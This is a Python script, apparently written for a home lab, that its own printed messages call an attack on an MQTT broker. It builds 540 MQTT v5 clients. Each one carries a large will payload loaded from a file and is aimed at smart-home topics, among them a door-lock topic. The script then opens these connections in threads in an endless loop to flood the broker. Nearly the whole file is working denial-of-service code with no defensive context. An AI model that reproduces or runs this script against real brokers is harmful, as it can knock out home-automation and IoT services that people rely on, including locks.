# -*- coding: utf-8 -*-
"""
Created on Sun Sep 11 00:31:01 2022

@author: james
"""

import threading
import random
import paho.mqtt.client as mqtt
import time
from paho.mqtt.properties import Properties
from paho.mqtt.packettypes import PacketTypes
import random

################################################
###### parametros DE CONEXION
clients=[] #array clientes
broker = '192.168.100.20'
port = 1883

nclients=540 #NUM CONEXIONES/clientes
DoSClients=4
keepalive=60
sesionExpira=30
conn_properties=Properties(PacketTypes.CONNECT)
topics=["/casa/intensidad", "/casa/cerradura", "/casa/temperatura"]
################################################
print("DESCRIPCION DEL ATAQUE:")
print("servidor MQTT: ", broker)
print("numero de puerto: ", port)
print("OPCIONES DE CONEXION")
print("keepalive:",keepalive)
print("timeOut:",sesionExpira)
print("mensaje willPayload: ","")

################################################
archivo=open("mosquittoL.txt")
archivo=archivo.read()
################################################
#creacion de clientes
print("CREANDO CLIENTES....")
for i  in range(nclients):
    cname=f'python-mqtt-Cliente__{random.randint(0, 1000000000000000000)}' #funcion para crear id aleatorio
    cname=cname+str(i)
    client=mqtt.Client(cname, protocol=mqtt.MQTTv5)
   #DECLARANDO MENSAJE DE INICIO con QoS=0
    client.will_set(topics[random.randint(0,2)],archivo, random.randint(0,2))
    conn_properties=Properties(PacketTypes.CONNECT)
    conn_properties.SessionExpiryInterval = sesionExpira
    clients.append(client)
print("FIN, CREACION DE CLIENTES")
################################################

def conectar(client,**datos):
    serverBRK=datos['broker']
    puertoMQTT=datos['puerto']
    keepAlive=datos['keepAlv']
    propertiesOpt=datos['connProperties']
    print(client.connect(serverBRK, puertoMQTT, keepAlive, properties=propertiesOpt))
    

NUM_HILOS = nclients
#funcion multihilo
contadorAux=0
print("=====INICIANDO ATAQUE========")
while(contadorAux<135):
    print("=====Iterando========")
    for i in range(DoSClients):
        hilo = threading.Thread(target=conectar, args=(clients[i+(contadorAux*DoSClients)],),
                                    kwargs={'broker':broker, 
                                            'puerto': port, 
                                            'keepAlv': keepalive, 
                                            'connProperties': conn_properties})
        hilo.start()
    time.sleep(1.5)
    #time.sleep(0.72)
    print("====fin iteracion i")
    contadorAux=contadorAux+1
    if(contadorAux==135):
        contadorAux=0